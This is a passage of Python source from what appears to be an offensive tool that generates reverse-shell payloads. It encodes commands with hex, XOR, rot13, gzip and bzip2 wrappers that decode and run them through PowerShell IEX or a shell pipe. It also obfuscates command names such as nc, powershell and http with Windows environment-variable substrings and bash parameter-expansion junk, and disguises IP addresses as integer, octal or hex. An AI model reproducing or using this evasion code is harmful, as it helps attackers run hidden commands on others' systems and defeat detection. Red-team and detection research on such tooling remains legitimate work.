        return payload

    def hex(self):
        payload = self.payload
        if "-c" in self.encode:
            if self.shell_type == "python":
                wrapper1 = "exec(bytearray.fromhex('{payload}').decode())"
                wrapper2 = "exec(__import__('binascii').unhexlify(bytes('{payload}')).decode())"
                wrapper = __import__('random').choice([wrapper1, wrapper2])
                payload = wrapper.format(payload="".join("{:02x}".format(ord(c)) for c in payload))
            elif self.shell_type == "powershell":
                wrapper = '''powershell "IEX(-join('{payload}'-split'(..)'|?{{$_}}|%{{[char][convert]::ToUInt32($_,16)}}))"'''
                payload = wrapper.format(payload="".join("{:02x}".format(ord(c)) for c in payload))

        else:
            if "windows" in self.platform:
                import re
                if re.search("^powershell\\s", payload, re.I):
                    wrapper = '''powershell "-join('{0}'-split'(..)'|?{{$_}}|%{{[char][convert]::ToUInt32($_,16)}})|{1}"'''
                else:
                    wrapper = '''powershell "-join('{0}'-split'(..)'|?{{$_}}|%{{[char][convert]::ToUInt32($_,16)}})|IEX"'''
                payload = wrapper.format("".join("{:02x}".format(ord(c)) for c in payload), self.shell_path)
            else:
                payload = "echo " + "".join(
                    "{:02x}".format(ord(c)) for c in payload) + "|xxd -r -p|" + self.shell_path

        return payload

    def xor(self):
        import random
        payload = self.payload
        if "-c" in self.encode:
            if self.shell_type == "python":
                wrapper = '''exec(''.join([chr(ord(j)^ord('{key}')) for j in bytearray.fromhex('{payload}').decode()]))'''
                key = random.choice(__import__('string').ascii_letters + __import__('string').ascii_uppercase)
                payload = "".join([chr(ord(j) ^ ord(key)) for j in payload])
                payload = "".join("{:02x}".format(ord(c)) for c in payload)
                payload = wrapper.format(payload=payload, key=key)

        else:
            xor_string = ""
            if "windows" in self.platform:
                key = random.choice([random.randint(0, 9), chr(random.randint(65, 70)), chr(random.randint(97, 102))])
                key = int('0x{}{}'.format(random.randint(0, 5), key), 0)
                for i in payload:
                    xor_string += str(ord(i) ^ key) + ','
                psWrapper = '''powershell "-Join(({0})|%{{[char]($_-BXOR {1})}})"|{2}'''
                payload = psWrapper.format(xor_string[:-1], hex(key), self.shell_path)
            else:
                key = random.randint(0, 127)
                for i in payload:
                    xor_string += chr(ord(i) ^ key)
                xor_string = xor_string.encode()
                # xor_string = bytes(xor_string, encoding='utf-8')
                xor_string = __import__('binascii').hexlify(xor_string).decode('raw_unicode_escape')
                xorWrapper = '''{var1}="";for {var2} in $(echo {xor_string}|sed "s/../&\\n/g"); do {var1}=${var1}$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\",xor(0x${var2},{key})}}"|sed "s/../\\\\\\\\x&/g"));done;echo ${var1}|{shell_path}'''
                payload = xorWrapper.format(var1=chr(random.randint(97, 122)), var2=chr(random.randint(97, 122)),
                                            xor_string=xor_string, key=hex(key), shell_path=self.shell_path)

        return payload

    def rot13(self):
        payload = self.payload
        if "-c" in self.encode:
            if self.shell_type == "python":
                wrapper = '''python -c "exec(__import__('codecs').decode('{payload}','rot13'))"'''
                d = {}
                for c in (65, 97):
                    for i in range(26):
                        d[chr(i + c)] = chr((i + 13) % 26 + c)
                payload = payload.replace("'", "\\'").replace("\"", "\\\"")
                payload = "".join([d.get(c, c) for c in payload])
                payload = wrapper.format(payload=payload)

        return payload

    def bzip2(self):
        payload = self.payload
        if "windows" not in self.platform:
            payload = __import__('base64').b64encode(__import__('bz2').compress(payload.encode())).decode()
            wrapper = "echo {0}|base64 -d|bunzip2 -c|" + self.shell_path
            payload = wrapper.format(payload)

        return payload

    def gzip(self):
        payload = self.payload
        payload = __import__('base64').b64encode(__import__('gzip').compress(payload.encode())).decode()
        if "windows" in self.platform:
            wrapper = '''powershell /c "sal {var} New-Object;IEx({var} IO.StreamReader(({var} IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String('{payload}'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"'''
            payload = wrapper.format(var=chr(__import__('random').randint(97, 122)), payload=payload)
        else:
            wrapper = "echo {0}|base64 -d|gunzip -c|" + self.shell_path
            payload = wrapper.format(payload)

        return payload

    @staticmethod
    def url(payload):
        return str(__import__('requests').utils.quote(payload))


class Obfuscator:
    import re
    binaryRegexStr = r":\w+:"
    requiredWhitespaceRegexStr = r"\^ \^"
    optionalWhitespaceRegexStr = r"\? \?"
    requiredWhitespaceAndRandCharsRegexStr = "% %"
    optionalWhitespaceAndRandCharsRegexStr = r"\* \*"
    integerNoWrapperRegexStr = r"#\d+#"
    integerWithWrapperRegexStr = r"&\d+&"
    commandEndRegexStr = "END[01]?"

    binaryEscapedRegexStr = r"\\:\w+\\:"
    requiredWhitespaceEscapedRegexStr = r"\\\^ \\\^"
    optionalWhitespaceEscapedRegexStr = r"\\\? \\\?"
    requiredWhitespaceAndRandCharsEscapedRegexStr = r"\\% \\%"
    optionalWhitespaceAndRandCharsEscapedRegexStr = r"\\\* \\\*"
    integerNoWrapperEscapedRegexStr = r"\\#\d+\\#"
    integerWithWrapperEscapedRegexStr = r"\\&\d+\\&"

    binaryRegex = re.compile(binaryRegexStr)
    requiredWhitespaceRegex = re.compile(requiredWhitespaceRegexStr)
    optionalWhitespaceRegex = re.compile(optionalWhitespaceRegexStr)
    requiredWhitespaceAndRandCharsRegex = re.compile(requiredWhitespaceAndRandCharsRegexStr)
    optionalWhitespaceAndRandCharsRegex = re.compile(optionalWhitespaceAndRandCharsRegexStr)
    integerNoWrapperRegex = re.compile(integerNoWrapperRegexStr)
    integerWithWrapperRegex = re.compile(integerWithWrapperRegexStr)
    commandEndRegex = re.compile(commandEndRegexStr)

    boblRegexStr = "{0}|{1}|{2}|{3}|{4}|{5}|{6}|{7}".format(
        binaryRegexStr,
        requiredWhitespaceRegexStr,
        optionalWhitespaceRegexStr,
        requiredWhitespaceAndRandCharsRegexStr,
        optionalWhitespaceAndRandCharsRegexStr,
        integerNoWrapperRegexStr,
        integerWithWrapperRegexStr,
        commandEndRegexStr
    )

    escapedBoblRegexStr = "{0}|{1}|{2}|{3}|{4}|{5}|{6}".format(
        binaryEscapedRegexStr,
        requiredWhitespaceEscapedRegexStr,
        optionalWhitespaceEscapedRegexStr,
        requiredWhitespaceAndRandCharsEscapedRegexStr,
        optionalWhitespaceAndRandCharsEscapedRegexStr,
        integerNoWrapperEscapedRegexStr,
        integerWithWrapperEscapedRegexStr
    )

    boblRegex = re.compile(boblRegexStr)
    escapedBoblRegex = re.compile(escapedBoblRegexStr)
    completeBoblRegex = re.compile(boblRegexStr + r'|' + re.escape(escapedBoblRegexStr))

    def __init__(self):
        self.randWhitespaceRange = None
        self.booleanCmdTerminator = False
        self.nonBooleanCmdTerminator = False
        self.cmdCounter = 0
        self.quoted = False
        self.terminatedCmdLast = False
        self.payload_lines = []
        self.randGen = RandomGen()
        self.randGen.sizePref = 2
        self.extraJunk = ""
        # del self.payload_lines[:]
        self.finalPayload = ""
        self.mangleBinaries = True
        self.binaryManglePercent = 30
        self.randWhitespace = False
        self.insertChars = True
        self.insertCharsRange = (1, 2)
        self.randomizeTerminators = True

        self.escapeQuotes = True
        self.stub = '''* *:printf:^ ^%s^ ^'CMD'* *|* *:rev:* *END0* *'''

    def obf(self, payload=None, obfuscator=None, platform=None):
        import random
        import re
        if obfuscator == "replace_char":
            if "windows" in platform:
                num = random.randint(16, 999)
                char_C = random.choice(["%PROGRAMFILES:~-" + str(num) + ",1%", "%PROGRAMFILES:~0,1%"])
                char_c = random.choice(["%COMSPEC:~20,1%", "%COMSPEC:~-7,1%", "%PUBLIC:~14,1%", "%PUBLIC:~-1,1%"])
                # charM = random.choice(["m", "M", "%PROGRAMFILES:~-7,1%", "%PROGRAMFILES:~9,1%"])
                # charD = random.choice(["d", "D", "%PATHEXT:~18,1%"])
                char_E = random.choice(["%PROGRAMFILES:~14,1%", "%PROGRAMFILES:~-2,1%"])
                char_e = random.choice(["%PROGRAMFILES:~14,1%", "%PROGRAMFILES:~-2,1%"])
                # charX = random.choice(["x", "X", "%PROGRAMFILES(X86):~18,1%", "%PROGRAMFILES(X86):~-4,1%"])
                char_P = random.choice(["%PROGRAMFILES:~3,1%", "%PROGRAMFILES:~-13,1%"])
                # charO = random.choice(["o", "O", "%PROGRAMFILES:~5,1%", "%PROGRAMFILES:~-11,1%"])
                # charW = random.choice(["%OS:~0,1%", "%oS:~-" + str(num) + ",1%"])
                # charR = random.choice(["r", "R", "%PROGRAMFILES:~4,1%", "%PROGRAMFILES:~-9,1%", "%PROGRAMFILES(X86):~4,1%", "%PROGRAMFILES(X86):~-15,1%"])
                # charS = random.choice(["%PROGRAMFILES:~-1,1%", "%PROGRAMFILES:~15,1%", "%PROGRAMFILES(X86):~15,1%"])
                char_l = random.choice(["%PROGRAMFILES:~-3,1%", "%PROGRAMFILES:~13,1%", "%PROGRAMFILES(X86):~13,1%"])
                char_t = random.choice(["%ALLUSERSPROFILE:~12,1%", "%ALLUSERSPROFILE:~-2,1%"])
                char_N = random.choice(["l%WINDIR:~5,1%", "%WINDIR:~-5,1%", "%SYSTEMROOT:~5,1%", "%SYSTEMROOT:~-5,1%",
                                        "%COMSPEC:~5,1%"])
                char_n = random.choice(["%COMMONPROGRAMFILES:~22,1%", "%COMMONPROGRAMFILES:~-7,1%"])
                # char_dot = random.choice(["%PATHEXT:~0,1%", "%PATHEXT:~5,1%", "%PATHEXT:~10,1%", "%PATHEXT:~15,1%"])
                whitespace = random.choice(
                    ["%PROGRAMFILES:~10,-5%", "%PROGRAMFILES:~-6,-5%", "%COMMONPROGRAMFILES:~10,-18%",
                     "%COMMONPROGRAMFILES:~-6,-5%"])
                num_2 = random.choice(["%COMSPEC:~18,1%", "%COMSPEC:~-9,1%"])
                num_3 = random.choice(["%COMSPEC:~17,1%", "%COMSPEC:~-10,1%"])
                num_6 = random.choice(["%ProgramFiles(x86):~20,1%", "%ProgramFiles(x86):~-2,1%"])
                num_8 = random.choice(["%ProgramFiles(x86):~19,1%", "%ProgramFiles(x86):~-3,1%"])
                # str_CMD = random.choice(["%PATHEXT:~16,3%", char_C + charM + charD])
                # str_EXE = random.choice(["%PATHEXT:~5,4%", "." + char_E + charX + char_E])
                str_exe = "." + char_e + "x" + char_e
                str_Powershell = char_P + "ow" + char_e + "rsh" + char_e + "ll"
                str_nc = char_n + char_c
                str_NC = char_N + char_C
                str_echo = char_e + char_c + "ho"
                str_cmd = char_c + "md"
                str_join = "joi" + char_n
                str_split = "sp" + char_l + "it"
                str_convert = "conv" + char_e + "rt"
                str_ToUInt32 = "ToUI" + char_n + "t32"
                str_IEX = "I" + char_E + "X"
                str_http = "h" + char_t * 2 + "p"
                random_num = random.choice([2, 3, 6, 8])
                num_dict = {2: num_2, 3: num_3, 6: num_6, 8: num_8}
                for num, new_num in num_dict.items():
                    if random_num == num:
                        payload = payload.replace(str(num), new_num, random.randint(1, 9))

                str_dict = {" ": whitespace, ".exe": str_exe, "cmd": str_cmd, "join": str_join, "split": str_split,
                            "convert": str_convert, "ToUInt32": str_ToUInt32, "http": str_http, "nc": str_nc,
                            "NC": str_NC, "echo": str_echo, "IEX": str_IEX, "powershell": str_Powershell,
                            "PowerShell": str_Powershell, "POWERSHELL": str_Powershell}
                for _str, new_str in str_dict.items():
                    payload = payload.replace(_str, new_str)
                # payload = payload.replace(".", char_dot, random.randint(1, 9))
            else:
                randnum = str(random.randint(3, 65535))
                whitespace = "${IFS:-" + randnum + random.choice([":0}", ":1}", ":-1}", ":-2}", ":-3}"])
                # null_char = random.choice(["$#", "${IFS:" + randnum + random.choice([":0}", ":1}", ":-1}", ":-2}", ":-3}"])])
                # forward_slash = random.choice(["${BASH:0:1}", "${PWD:0:1}", "${HOME:0:1}"])
                # num_1 = random.choice(["${OPTERR:-", "${OPTIND:-"]) + randnum + ":1}"
                num_0 = "$#"

                payload = re.sub(r"(?!\s\d)(\s)", whitespace, payload)
                for c in __import__('string').ascii_lowercase + "123456789/":
                    payload = payload.replace(c, "$@" + c)
                payload = payload.replace("0", num_0)
                # payload = payload.replace("0", num_0).replace("1", num_1)
                # payload = payload.replace("/", forward_slash)

        elif obfuscator == "reverse" and "windows" not in platform:
            payload = payload[::-1]
            if self.escapeQuotes:
                payload = payload.replace("'", "'\"'\"'")
            genStub = self.stub
            for var in re.findall(r"VAR\d+", genStub):
                genStub = genStub.replace(var, self.randGen.randGenVar())

            genStub = self.getMangledLine(genStub)
            payload = genStub.replace("CMD", payload)

            self.randGen.forgetUniqueStrs()
            payload = self.mangleLine('* *:eval:^ ^"$(? ?DATA? ?)"* *', payload)

        return payload

    @staticmethod
    def ipObf(ip, ip_obfuscator=None):
        ip = ip
        if ip_obfuscator == "ip2int":
            ip = int("".join(["{0:08b}".format(num) for num in map(int, ip.split('.'))]), 2)
        elif ip_obfuscator == "ip2oct":
            ip = str(oct(int("".join(["{0:08b}".format(num) for num in map(int, ip.split('.'))]), 2)))[2:].zfill(12)
        elif ip_obfuscator == "ip2hex":
            ip = hex(int("".join(["{0:08b}".format(num) for num in map(int, ip.split('.'))]), 2))

        return ip

    def getMangledLine(self, payload_line, input_chunk=None):
        self.addpayload_line(payload_line, input_chunk)
        return self.getFinalPayload()

    def addpayload_line(self, payload_line, inputChunk=None):
        mangledpayload_line = self.mangleLine(payload_line, inputChunk)
        self.payload_lines.append(mangledpayload_line)

    def mangleLine(self, payload_line, inputChunk=None):
        mangledpayload_line = payload_line
        bobl_syntax_match = Obfuscator.completeBoblRegex.search(mangledpayload_line)
        while bobl_syntax_match:
            if Obfuscator.boblRegex.match(bobl_syntax_match.group()):
                if Obfuscator.binaryRegex.match(bobl_syntax_match.group()):
                    mangledpayload_line, search_pos = self._mangleBinary(bobl_syntax_match, mangledpayload_line)

                elif Obfuscator.requiredWhitespaceRegex.match(bobl_syntax_match.group()):
                    mangledpayload_line, search_pos = self._insertWhitespaceAndRandChars(bobl_syntax_match,
                                                                                         mangledpayload_line, True,
                                                                                         False)
                elif Obfuscator.optionalWhitespaceRegex.match(bobl_syntax_match.group()):
                    mangledpayload_line, search_pos = self._insertWhitespaceAndRandChars(bobl_syntax_match,
                                                                                         mangledpayload_line, False,
                                                                                         False)
                elif Obfuscator.requiredWhitespaceAndRandCharsRegex.match(bobl_syntax_match.group()):
                    mangledpayload_line, search_pos = self._insertWhitespaceAndRandChars(bobl_syntax_match,
                                                                                         mangledpayload_line, True,
                                                                                         True)
                elif Obfuscator.optionalWhitespaceAndRandCharsRegex.match(bobl_syntax_match.group()):
                    mangledpayload_line, search_pos = self._insertWhitespaceAndRandChars(bobl_syntax_match,
                                                                                         mangledpayload_line, False,
                                                                                         True)
                elif Obfuscator.commandEndRegex.match(bobl_syntax_match.group()):
                    mangledpayload_line, search_pos = self._getCommandTerminator(bobl_syntax_match, mangledpayload_line)
            else:
                escaped_data = mangledpayload_line[bobl_syntax_match.start() + 1:bobl_syntax_match.end() - 2] + \
                               mangledpayload_line[bobl_syntax_match.end() - 1]
                mangledpayload_line = mangledpayload_line[
                                      :bobl_syntax_match.start()] + escaped_data + mangledpayload_line[
                                                                                   bobl_syntax_match.end():]
                search_pos = bobl_syntax_match.end() - 2
            bobl_syntax_match = Obfuscator.completeBoblRegex.search(mangledpayload_line, pos=search_pos)
        if inputChunk:
            mangledpayload_line = mangledpayload_line.replace("DATA", inputChunk)
        return mangledpayload_line

    def _mangleBinary(self, binaryMatch, payload_line):
        mangled_binary = ""
        ansi_c_quoted_char = ""
        ansi_c_hex = False
        ansiCOctal = False
        lastCharNotMangled = False
        lastCharAnsiCQuoted = False
        import string
        hexValues = string.digits + "abcdef"
        binaryStr = payload_line[binaryMatch.start() + 1:binaryMatch.end() - 1]
        if self.mangleBinaries:
            for char in binaryStr:
                if self.randGen.probibility(self.binaryManglePercent / 3):
                    if self.randGen.probibility(50):
                        mangled_binary += '""'
                    else:
                        mangled_binary += "''"
                    lastCharAnsiCQuoted = False
                if self.randGen.probibility(self.binaryManglePercent):
                    choiceNum = 5 if char.isdigit() else 4
                    choice = self.randGen.randChoice(choiceNum)
                    if choice == 0:
                        mangled_binary += "\\" + char
                        lastCharAnsiCQuoted = False
                    elif choice == 1:
                        if self.randGen.probibility(50):
                            mangled_binary += '"' + char + '"'
                        else:
                            mangled_binary += "'" + char + "'"
                        lastCharAnsiCQuoted = False
                    elif choice == 2:
                        if lastCharNotMangled and mangled_binary[-1] not in ["'", '"'] and self.randGen.probibility(
                                self.binaryManglePercent):
                            ansi_c_quoted_char = self._getAnsiCQuotedStr(char)
                            ansiCValue = ansi_c_quoted_char[2:]
                            mangled_binary = mangled_binary[:-1] + "$'" + mangled_binary[-1] + ansiCValue
                            if ansiCValue[2] == "x":
                                ansi_c_hex = True
                                ansiCOctal = False
                            elif ansiCValue[2] != "u" and ansiCValue[2] != "U":
                                ansiCOctal = True
                                ansi_c_hex = False
                            else:
                                ansi_c_hex = False
                                ansiCOctal = False
                        elif lastCharAnsiCQuoted and self.randGen.probibility(50):
                            ansi_c_quoted_char = self._getAnsiCQuotedStr(char)
                            ansiCValue = ansi_c_quoted_char[2:]
                            mangled_binary = mangled_binary[:-1] + ansiCValue
                            if ansiCValue[1] == "x":
                                ansi_c_hex = True
                                ansiCOctal = False
                            elif ansiCValue[1] != "u" and ansiCValue[1] != "U":
                                ansiCOctal = True
                                ansi_c_hex = False
                            else:
                                ansi_c_hex = False
                                ansiCOctal = False
                        else:
                            ansi_c_quoted_char = self._getAnsiCQuotedStr(char)
                            mangled_binary += ansi_c_quoted_char
                            if ansi_c_quoted_char[3] == "x":
                                ansi_c_hex = True
                                ansiCOctal = False
                            elif ansi_c_quoted_char[3] != "u" and ansi_c_quoted_char[3] != "U":
                                ansiCOctal = True
                                ansi_c_hex = False
                            else:
                                ansi_c_hex = False
                                ansiCOctal = False
                        lastCharAnsiCQuoted = True
                    elif choice == 3:
                        mangled_binary += self._getRandChars() + char
                        lastCharAnsiCQuoted = False
                    lastCharNotMangled = False
                else:
                    appendChar = False
                    if lastCharAnsiCQuoted:
                        if ansi_c_hex and (len(ansi_c_quoted_char) == 7 or char not in hexValues):
                            appendChar = True
                        elif ansiCOctal and (len(ansi_c_quoted_char) >= 7 or not (char.isdigit() and int(char) < 8)):
                            appendChar = True
                        elif not ansi_c_hex and not ansiCOctal:
                            appendChar = True
                    if appendChar and self.randGen.probibility(self.binaryManglePercent):
                        mangled_binary = mangled_binary[:-1] + char + "'"
                        lastCharNotMangled = False
                        lastCharAnsiCQuoted = True
                    else:
                        mangled_binary += char
                        lastCharNotMangled = True
                        lastCharAnsiCQuoted = False
        else:
            mangled_binary = binaryStr
        mangledpayload_line = payload_line[:binaryMatch.start()] + mangled_binary + payload_line[binaryMatch.end():]
        search_pos = len(payload_line[:binaryMatch.start()] + mangled_binary)
        return mangledpayload_line, search_pos

    def _getAnsiCQuotedStr(self, inStr):
        maxChoice = 3
        encodedStr = "$'\\"
        for char in inStr:
            choice = self.randGen.randChoice(maxChoice)
            if choice == 0:
                encodedStr += oct(ord(char))[2:] + "\\"
            elif choice == 1:
                encodedStr += hex(ord(char))[1:] + "\\"
            elif choice == 2:
                encodedStr += "u00" + hex(ord(char))[2:] + "\\"
            else:
                encodedStr += "U000000" + hex(ord(char))[2:] + "\\"
        encodedStr = encodedStr[:-1] + "'"
        return encodedStr

    def _insertWhitespaceAndRandChars(self, whitespaceMatch, payload_line, whitespaceRequired, insertRandChars):
        randCharsAndWhitespace = self._getWhitespaceAndRandChars(whitespaceRequired, insertRandChars)
        mangledpayload_line = payload_line[:whitespaceMatch.start()] + randCharsAndWhitespace + payload_line[
                                                                                                whitespaceMatch.end():]
        search_pos = len(payload_line[:whitespaceMatch.start()] + randCharsAndWhitespace)
        return mangledpayload_line, search_pos

    def _getWhitespaceAndRandChars(self, whitespaceRequired, insertRandChars):
        randCharsAndWhitespace = ""
        if not (insertRandChars and self.insertChars):
            randCharsAndWhitespace = self._getRandWhitespace(whitespaceRequired)
        elif insertRandChars and self.insertChars:
            charsInsertNum = self.randGen.randGenNum(self.insertCharsRange[0], self.insertCharsRange[1])
            for _ in range(charsInsertNum):
                if self.randWhitespace:
                    randCharsAndWhitespace += self._getRandWhitespace(whitespaceRequired)
                randCharsAndWhitespace += self._getRandChars()
            randCharsAndWhitespace += self._getRandWhitespace(whitespaceRequired)
        return randCharsAndWhitespace

    def _getRandWhitespace(self, whitespaceRequired):
        if not self.randWhitespace:
            whitespaceAmount = 1 if whitespaceRequired else 0
        else:
            if whitespaceRequired and (not self.randWhitespaceRange or self.randWhitespaceRange[0] == 0):
                minSpace = 1
            else:
                minSpace = self.randWhitespaceRange[0]
            whitespaceAmount = self.randGen.randGenNum(minSpace, self.randWhitespaceRange[1])
        return " " * whitespaceAmount

    def _getRandChars(self):
        randChars = ""
        charsToEscape = "[]!(){}'`" + '"'
        varSymbol = self.randGen.randSelect(["@", "*"])
        choice = self.randGen.randChoice(17)
        if self.quoted and choice == 2:
            while choice == 2:
                choice = self.randGen.randChoice(17)
        if varSymbol == "@" and choice != 2 and self.randGen.probibility(50):
            randChars = '"'
            self.quoted = True
        else:
            self.quoted = False
        if choice == 0:
            randChars += "$" + varSymbol
        elif choice == 1:
            randChars += "${{{}}}".format(varSymbol)
        elif choice == 2:
            randChars += "${{!{}}}".format(varSymbol)
        elif 2 < choice <= 8:
            randParameterExpansionOperator = self.randGen.randSelect(["^", "^^", ",", ",,", "~", "~~"])
            randChars += "${{{0}{1}}}".format(varSymbol, randParameterExpansionOperator)
        elif 8 < choice <= 14:
            randParameterExpansionOperator = self.randGen.randSelect(["#", "##", "%", "%%", "/", "//"])
            randStr = self.randGen.randGenStr(escapeChars=charsToEscape, noBOBL=False)
            randStr = self._sanatizeExpansionString(randStr)
            # print("varSymbol",varSymbol)
            randChars += "${{{0}{1}{2}}}".format(varSymbol, randParameterExpansionOperator, randStr)
        else:
            randStr = self.randGen.randGenStr(escapeChars=charsToEscape, noBOBL=False)
            randStr = self._sanatizeExpansionString(randStr)
            randParameterExpansionOperator = self.randGen.randSelect(["/", "//"])
            randStr2 = self.randGen.randGenStr(escapeChars=charsToEscape, noBOBL=False)
            randStr2 = self._sanatizeExpansionString(randStr2)
            randChars += "${{{0}{1}{2}/{3}}}".format(varSymbol, randParameterExpansionOperator, randStr, randStr2)
        if self.quoted:
            randChars += '"'
        return randChars

    @staticmethod
    def _sanatizeExpansionString(exStr):
        oddSlashes = False
        for char in exStr[::-1]:
            if char == "\\":
                oddSlashes = not oddSlashes
            else:
                break
        if oddSlashes:
            exStr += "\\"
        return exStr

    def _getCommandTerminator(self, terminatorMatch, payload_line):
        cmdReturnsTrue = False
        self.booleanCmdTerminator = False
        self.nonBooleanCmdTerminator = True
        if payload_line[terminatorMatch.end() - 1].isdigit():
            self.nonBooleanCmdTerminator = False
            if payload_line[terminatorMatch.end() - 1] == "0":
                cmdReturnsTrue = True
        self.debug = False
        if self.debug:
            cmdTerminator = "\n"
        else:
            if self.cmdCounter == 0:
                self.cmdBufferOffset = self.randGen.randGenNum(1250, 1750)
            if self.cmdCounter == self.cmdBufferOffset:
                self.cmdCounter = 0
                cmdTerminator = "\n"
            else:
                if self.randomizeTerminators and not self.nonBooleanCmdTerminator and self.randGen.probibility(50):
                    self.booleanCmdTerminator = True
                    cmdTerminator = "&&" if cmdReturnsTrue else "||"
                else:
                    cmdTerminator = ";"
            self.cmdCounter += 1
        self.cmdTerminatorPos = terminatorMatch.start()
        mangledpayload_line = payload_line[:terminatorMatch.start()] + cmdTerminator + payload_line[
                                                                                       terminatorMatch.end():]
        search_pos = len(payload_line[:terminatorMatch.start()] + cmdTerminator)
        return mangledpayload_line, search_pos

    def getFinalPayload(self):
        finalJunk = ""
        if self.booleanCmdTerminator:
            if len(self.payload_lines[-1]) > self.cmdTerminatorPos + 2:
                finalJunk = self.payload_lines[-1][self.cmdTerminatorPos + 2:]
            self.payload_lines[-1] = self.payload_lines[-1][:self.cmdTerminatorPos]
            if self.randGen.probibility(50):
                self.payload_lines[-1] += ";"
            self.payload_lines[-1] += finalJunk
        elif not self.nonBooleanCmdTerminator and self.cmdTerminatorPos != 0 and self.randGen.probibility(50):
            if len(self.payload_lines[-1]) > self.cmdTerminatorPos + 1:
                finalJunk = self.payload_lines[-1][self.cmdTerminatorPos + 1:]
            self.payload_lines[-1] = self.payload_lines[-1][:self.cmdTerminatorPos] + finalJunk
        self.finalPayload += "".join(self.payload_lines)
        self.finalPayload += self.extraJunk
        return self.finalPayload


class RandomGen(object):
    import string
    import re
    randGen = __import__('random').SystemRandom()
    _generatedVars = set()
    _uniqueRandStrs = set()
    _randStrCharList = [c for c in string.ascii_letters + string.digits + string.punctuation]
    _randStrCharList2 = [c for c in string.ascii_letters + string.digits]
    _randStrCharList.remove("\'")
    _randStrCharList.remove("\"")
    _randStrCharList.remove("/")
    _randStrCharList.remove("`")
    _randStrCharList.remove("[")
    _randStrCharList.remove("]")
    _randStrCharList.remove("{")
    _randStrCharList.remove("}")
    _reservedVars = {"auto_resume", "BASH", "BASH_ENV", "BASH_VERSINFO", "BASH_VERSION", "CDPATH", "COLUMNS",
                     "COMP_CWORD", "COMP_LINE", "COMP_POINT", "COMPREPLY", "COMP_WORDS", "DIRSTACK", "EUID", "FCEDIT",
                     "FIGNORE", "FUNCNAME", "GLOBIGNORE", "GROUPS", "histchars", "HISTCMD", "HISTCONTROL", "HISTFILE",
                     "HISTFILESIZE", "HISTIGNORE", "HISTSIZE", "HOME", "HOSTFILE", "HOSTNAME", "HOSTTYPE", "IFS",
                     "IGNOREEOF", "INPUTRC", "LANG", "LC_ALL", "LC_COLLATE", "LC_CTYPE", "LC_MESSAGES", "LC_NUMERIC",
                     "LINENO", "LINES", "MACHTYPE", "MAIL", "MAILCHECK", "MAILPATH", "OLDPWD", "OPTARG", "OPTERR",
                     "OPTIND", "OSTYPE", "PATH", "PIPESTATUS", "POSIXLY_CORRECT", "PPID", "PROMPT_COMMAND", "PS1",
                     "PS2", "PS3", "PS4", "PWD", "RANDOM", "REPLY", "SECONDS", "SHELLOPTS", "SHLVL", "TIMEFORMAT",
                     "TMOUT", "UID"}
    _boblReservedStrsRegex = re.compile("DATA|END")
    _boblSyntaxRegex = re.compile(r":\w+:|\^ \^|\? \?|% %|\* \*|#\d+#|&\d+&|DATA|END")

    def __init__(self):
        self.sizePref = 2

    @staticmethod
    def forgetUniqueStrs():
        RandomGen._generatedVars.clear()
        RandomGen._uniqueRandStrs.clear()

    @staticmethod
    def randGenNum(_min, _max):
        return RandomGen.randGen.randint(_min, _max)

    def randChoice(self, _max):
        return self.randGenNum(0, _max - 1)

    def probibility(self, prob):
        randNum = self.randGenNum(0, 100)
        return randNum <= prob

    @staticmethod
    def randSelect(seq):
        if isinstance(seq, dict):
            selection = RandomGen.randGen.choice(list(seq.keys()))
        elif seq:
            selection = RandomGen.randGen.choice(seq)
        else:
            selection = None
        return selection

    @staticmethod
    def randShuffle(seq):
        RandomGen.randGen.shuffle(seq)

    def randGenVar(self, minVarLen=None, maxVarLen=None):
        import string
        minVarLen, maxVarLen = self._getSizes(minVarLen, maxVarLen)
        randVarCharList = string.ascii_letters + string.digits + "_"
        while True:
            randomVar = self.randSelect(string.ascii_letters + "_")
            randomVar += self.randGenStr(minVarLen, maxVarLen - 1, randVarCharList)
            if len(randomVar) == 1 and randomVar.isdigit():
                continue
            if RandomGen._boblReservedStrsRegex.search(randomVar):
                continue
            if randomVar not in RandomGen._generatedVars and randomVar not in RandomGen._reservedVars:
                break
        RandomGen._generatedVars.add(randomVar)
        return randomVar

    def randGenStr(self, minStrLen=None, maxStrLen=None, charList=None, escapeChars="", noBOBL=True):
        minStrLen, maxStrLen = self._getSizes(minStrLen, maxStrLen)
        import re
        if charList is None:
            charList = RandomGen._randStrCharList
        randStrLen = RandomGen.randGen.randint(minStrLen, maxStrLen)
        randStr = "".join(self.randSelect(charList) for _ in range(randStrLen))
        randStr2 = "".join(self.randSelect(charList) for _ in range(randStrLen))
        if noBOBL:
            while RandomGen._boblSyntaxRegex.search(randStr):
                randStr = "".join(self.randSelect(charList) for _ in range(randStrLen))
        for char in escapeChars:
            randStr2 = re.sub(r"(?<!\\)(|.+?)(\\{2})*(?!\\)" + re.escape(char), '\\g<1>\\' + char, randStr)
        if randStr2 != randStr:
            # print("\n" + randStr + "\n" + randStr2)
            randStr = randStr2
        return randStr

    @staticmethod
    def _getSizes(minLen, maxLen):
        if minLen is None or maxLen is None:
            defaultMinLen = 4
            defaultMaxLen = defaultMinLen * 2
            if minLen is None:
                minLen = defaultMinLen
            if maxLen is None:
                maxLen = defaultMaxLen
        return minLen, maxLen


class Utils:
    def __init__(self):
        if not __import__("sys").stdout.isatty():
            for _ in dir():
                if isinstance(_, str) and _[0] != "_":
                    locals()[_] = ""
        else:
            if __import__("platform").system() == "Windows":
                __import__('colorama').init()

    def print_banner(self):
        import random
        cstr = ['1;32m', '1;33m', '1;35m', '1;36m']
        banner = random.choice(__BANNERS__).format(self.bright_white(__Version__), self.bright_white(__SITE__))
        for i, line in enumerate(banner.splitlines()):
            print('\033[{0}{1}\033[0m'.format(random.choice(cstr) if i in [random.randint(1, 9)]
                                              else random.choice(cstr), line))

    @staticmethod
    def RandomColoring(data=None, web=False):
        import random
        colors = ["1;32m", "1;33m", "1;35m", "1;36m", "1;37m"]
        webcolors = ["info", "warning", "light", "danger", "success"]
        if isinstance(data, list):
            if web:
                data = " - ".join(
                    ["<span class='text-{0}'>{1}</span>".format(random.choice(webcolors), _) for _ in data])
            else:
                data = " - ".join(["\033[{0}{1}\033[0m".format(random.choice(colors), _) for _ in data])
        else:
            if web:
                data = "<span class='text-{0}'>{1}</span>".format(random.choice(webcolors), data)
            else:
                data = "\033[{0}{1}\033[0m".format(random.choice(colors), data)
        return data

    def title(self, data=None):
        if isinstance(data, list):
